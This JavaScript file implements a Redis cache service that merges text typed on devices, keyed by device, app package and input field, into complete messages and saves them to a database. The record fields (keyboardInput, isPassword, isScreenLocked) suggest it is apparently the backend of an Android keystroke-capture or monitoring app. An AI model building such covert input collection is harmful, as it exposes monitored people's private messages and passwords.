const redis = require('redis');

class CacheService {
    constructor() {
        this.client = null;
        this.isConnected = false;
        this.messageTimeouts = new Map(); // Track timeout IDs for cleanup
    }

    async connect() {
        try {
            this.client = redis.createClient({
                host: 'localhost',
                port: 6379,
                retry_strategy: (options) => {
                    if (options.error && options.error.code === 'ECONNREFUSED') {
                        console.log('❌ Redis server refused connection. Starting without Redis cache.');
                        return undefined; // Don't retry
                    }
                    if (options.total_retry_time > 1000 * 60 * 60) {
                        console.log('❌ Redis retry time exhausted. Starting without Redis cache.');
                        return undefined;
                    }
                    if (options.attempt > 10) {
                        console.log('❌ Redis max retry attempts reached. Starting without Redis cache.');
                        return undefined;
                    }
                    return Math.min(options.attempt * 100, 3000);
                }
            });

            this.client.on('connect', () => {
                console.log('✅ Redis client connected');
                this.isConnected = true;
            });

            this.client.on('error', (err) => {
                console.log('❌ Redis client error:', err.message);
                this.isConnected = false;
            });

            this.client.on('end', () => {
                console.log('❌ Redis client disconnected');
                this.isConnected = false;
            });

            await this.client.connect();
            console.log('✅ Redis cache service initialized');
        } catch (error) {
            console.log('❌ Redis connection failed:', error.message);
            console.log('📝 Starting server without Redis cache (fallback to direct DB)');
            this.isConnected = false;
        }
    }

    async disconnect() {
        if (this.client && this.isConnected) {
            await this.client.quit();
            this.isConnected = false;
        }
    }

    /**
     * Generate cache key for device and field
     * Structure: pending_message:{deviceId}:{packageName}:{viewId}
     */
    getCacheKey(deviceId, packageName, viewId) {
        return `pending_message:${deviceId}:${packageName}:${viewId}`;
    }

    /**
     * Check if incoming text is part of existing cached message
     * Returns: { isPartOfExisting: boolean, cachedMessage: object|null, shouldUpdate: boolean }
     */
    async checkAndUpdateMessage(deviceId, packageName, viewId, incomingText) {
        if (!this.isConnected) {
            return { isPartOfExisting: false, cachedMessage: null, shouldUpdate: false };
        }

        try {
            const cacheKey = this.getCacheKey(deviceId, packageName, viewId);
            const cachedData = await this.client.get(cacheKey);

            if (!cachedData) {
                // No existing message, create new cache entry
                const messageData = {
                    deviceId,
                    packageName,
                    viewId,
                    currentText: incomingText,
                    lastUpdateTime: Date.now(),
                    startTime: Date.now(),
                    isActive: true,
                    updateCount: 1
                };

                await this.client.setEx(cacheKey, 30, JSON.stringify(messageData)); // 30 seconds TTL
                this.setMessageTimeout(deviceId, packageName, viewId);
                
                console.log(`📝 New message cached: ${packageName} - ${viewId}`);
                return { isPartOfExisting: false, cachedMessage: messageData, shouldUpdate: false };
            }

            const cachedMessage = JSON.parse(cachedData);
            
            // Check if incoming text is part of existing message
            if (this.isTextPartOfMessage(cachedMessage.currentText, incomingText)) {
                // Update existing message
                cachedMessage.currentText = incomingText;
                cachedMessage.lastUpdateTime = Date.now();
                cachedMessage.updateCount = (cachedMessage.updateCount || 0) + 1;
                cachedMessage.isActive = true;

                await this.client.setEx(cacheKey, 30, JSON.stringify(cachedMessage)); // Reset 30 seconds TTL
                this.resetMessageTimeout(deviceId, packageName, viewId);
                
                console.log(`🔄 Message updated in cache: ${packageName} - ${viewId} (${cachedMessage.updateCount} updates)`);
                return { isPartOfExisting: true, cachedMessage, shouldUpdate: false };
            } else {
                // Different message, save current cached message and start new one
                console.log(`📤 Different message detected, saving cached message: ${packageName} - ${viewId}`);
                
                // Save the cached message to database
                await this.saveCachedMessageToDB(cachedMessage);
                
                // Clear timeout for old message
                this.clearMessageTimeout(deviceId, packageName, viewId);
                
                // Start new message
                const newMessageData = {
                    deviceId,
                    packageName,
                    viewId,
                    currentText: incomingText,
                    lastUpdateTime: Date.now(),
                    startTime: Date.now(),
                    isActive: true,
                    updateCount: 1
                };

                await this.client.setEx(cacheKey, 30, JSON.stringify(newMessageData));
                this.setMessageTimeout(deviceId, packageName, viewId);
                
                return { isPartOfExisting: false, cachedMessage: newMessageData, shouldUpdate: true };
            }
        } catch (error) {
            console.error('❌ Redis cache error:', error);
            return { isPartOfExisting: false, cachedMessage: null, shouldUpdate: false };
        }
    }

    /**
     * Check if incoming text is part of existing message
     */
    isTextPartOfMessage(existingText, incomingText) {
        if (!existingText || !incomingText) return false;
        
        // Normalize texts for comparison
        const normalizedExisting = existingText.toLowerCase().trim();
        const normalizedIncoming = incomingText.toLowerCase().trim();
        
        // Check if incoming text contains existing text (user is adding more)
        if (normalizedIncoming.includes(normalizedExisting)) {
            return true;
        }
        
        // Check if existing text contains incoming text (user is editing)
        if (normalizedExisting.includes(normalizedIncoming)) {
            return true;
        }
        
        // Check for significant overlap (80% similarity)
        const similarity = this.calculateSimilarity(normalizedExisting, normalizedIncoming);
        return similarity > 0.8;
    }

    /**
     * Calculate text similarity using Levenshtein distance
     */
    calculateSimilarity(str1, str2) {
        const longer = str1.length > str2.length ? str1 : str2;
        const shorter = str1.length > str2.length ? str2 : str1;
        
        if (longer.length === 0) return 1.0;
        
        const distance = this.levenshteinDistance(longer, shorter);
        return (longer.length - distance) / longer.length;
    }

    /**
     * Calculate Levenshtein distance between two strings
     */
    levenshteinDistance(str1, str2) {
        const matrix = [];
        
        for (let i = 0; i <= str2.length; i++) {
            matrix[i] = [i];
        }
        
        for (let j = 0; j <= str1.length; j++) {
            matrix[0][j] = j;
        }
        
        for (let i = 1; i <= str2.length; i++) {
            for (let j = 1; j <= str1.length; j++) {
                if (str2.charAt(i - 1) === str1.charAt(j - 1)) {
                    matrix[i][j] = matrix[i - 1][j - 1];
                } else {
                    matrix[i][j] = Math.min(
                        matrix[i - 1][j - 1] + 1,
                        matrix[i][j - 1] + 1,
                        matrix[i - 1][j] + 1
                    );
                }
            }
        }
        
        return matrix[str2.length][str1.length];
    }

    /**
     * Set timeout for message completion (30 seconds)
     * Timeout key includes device ID for multi-device support
     */
    setMessageTimeout(deviceId, packageName, viewId) {
        const timeoutId = setTimeout(async () => {
            await this.completeMessage(deviceId, packageName, viewId);
        }, 30 * 1000); // 30 seconds

        const key = `${deviceId}:${packageName}:${viewId}`;
        this.messageTimeouts.set(key, timeoutId);
    }

    /**
     * Reset timeout for message completion
     */
    resetMessageTimeout(deviceId, packageName, viewId) {
        this.clearMessageTimeout(deviceId, packageName, viewId);
        this.setMessageTimeout(deviceId, packageName, viewId);
    }

    /**
     * Clear timeout for message completion
     */
    clearMessageTimeout(deviceId, packageName, viewId) {
        const key = `${deviceId}:${packageName}:${viewId}`;
        const timeoutId = this.messageTimeouts.get(key);
        if (timeoutId) {
            clearTimeout(timeoutId);
            this.messageTimeouts.delete(key);
        }
    }

    /**
     * Complete message and save to database
     */
    async completeMessage(deviceId, packageName, viewId) {
        if (!this.isConnected) return;

        try {
            const cacheKey = this.getCacheKey(deviceId, packageName, viewId);
            const cachedData = await this.client.get(cacheKey);

            if (cachedData) {
                const cachedMessage = JSON.parse(cachedData);
                console.log(`⏰ Message timeout completed: ${packageName} - ${viewId}`);
                
                // Save to database
                await this.saveCachedMessageToDB(cachedMessage);
                
                // Remove from cache
                await this.client.del(cacheKey);
                
                // Clear timeout
                this.clearMessageTimeout(deviceId, packageName, viewId);
            }
        } catch (error) {
            console.error('❌ Error completing cached message:', error);
        }
    }

    /**
     * Save cached message to database
     */
    async saveCachedMessageToDB(cachedMessage) {
        try {
            const TextInput = require('../models/TextInput');
            
            const textInputData = {
                id: `${cachedMessage.deviceId}_${cachedMessage.packageName}_${cachedMessage.viewId}_${cachedMessage.startTime}`,
                timestamp: new Date(cachedMessage.startTime),
                packageName: cachedMessage.packageName,
                appName: cachedMessage.packageName, // You might want to get actual app name
                deviceId: cachedMessage.deviceId,
                keyboardInput: cachedMessage.currentText,
                inputField: cachedMessage.viewId,
                inputType: 'complete_message',
                screenTitle: '',
                fieldHint: '',
                isPassword: false,
                isScreenLocked: false,
                activityName: '',
                viewId: cachedMessage.viewId,
                deviceModel: '',
                androidVersion: '',
                createdAt: new Date(),
                updatedAt: new Date()
            };

            const textInput = new TextInput(textInputData);
            await textInput.save();
            
            console.log(`✅ Cached message saved to DB: ${cachedMessage.packageName} - ${cachedMessage.viewId}`);
        } catch (error) {
            console.error('❌ Error saving cached message to DB:', error);
        }
    }

    /**
     * Force complete all pending messages (for cleanup)
     */
    async completeAllPendingMessages() {
        if (!this.isConnected) return;

        try {
            const keys = await this.client.keys('pending_message:*');
            for (const key of keys) {
                const cachedData = await this.client.get(key);
                if (cachedData) {
                    const cachedMessage = JSON.parse(cachedData);
                    await this.saveCachedMessageToDB(cachedMessage);
                    await this.client.del(key);
                }
            }
            console.log(`✅ Completed ${keys.length} pending messages`);
        } catch (error) {
            console.error('❌ Error completing all pending messages:', error);
        }
    }

    /**
     * Get cache statistics
     */
    async getCacheStats() {
        if (!this.isConnected) {
            return { connected: false, pendingMessages: 0 };
        }

        try {
            const keys = await this.client.keys('pending_message:*');
            
            // Group by device ID
            const deviceStats = {};
            for (const key of keys) {
                // Key format: pending_message:deviceId:packageName:viewId
                const parts = key.split(':');
                if (parts.length >= 4) {
                    const deviceId = parts[1]; // deviceId is the second part after pending_message
                    if (!deviceStats[deviceId]) {
                        deviceStats[deviceId] = 0;
                    }
                    deviceStats[deviceId]++;
                }
            }
            
            return {
                connected: true,
                pendingMessages: keys.length,
                deviceStats: deviceStats,
                keys: keys.slice(0, 10) // Show first 10 keys
            };
        } catch (error) {
            console.error('❌ Error getting cache stats:', error);
            return { connected: false, pendingMessages: 0, error: error.message };
        }
    }

    /**
     * Get cache statistics for a specific device
     */
    async getDeviceCacheStats(deviceId) {
        if (!this.isConnected) {
            return { connected: false, pendingMessages: 0 };
        }

        try {
            const devicePattern = `pending_message:${deviceId}:*`;
            const keys = await this.client.keys(devicePattern);
            
            // Get message details for this device
            const messages = [];
            for (const key of keys) {
                const cachedData = await this.client.get(key);
                if (cachedData) {
                    const message = JSON.parse(cachedData);
                    messages.push({
                        key: key,
                        packageName: message.packageName,
                        viewId: message.viewId,
                        currentText: message.currentText.substring(0, 50) + (message.currentText.length > 50 ? '...' : ''),
                        updateCount: message.updateCount || 0,
                        lastUpdateTime: new Date(message.lastUpdateTime).toISOString()
                    });
                }
            }
            
            return {
                connected: true,
                deviceId: deviceId,
                pendingMessages: keys.length,
                messages: messages
            };
        } catch (error) {
            console.error('❌ Error getting device cache stats:', error);
            return { connected: false, pendingMessages: 0, error: error.message };
        }
    }
}

module.exports = new CacheService();
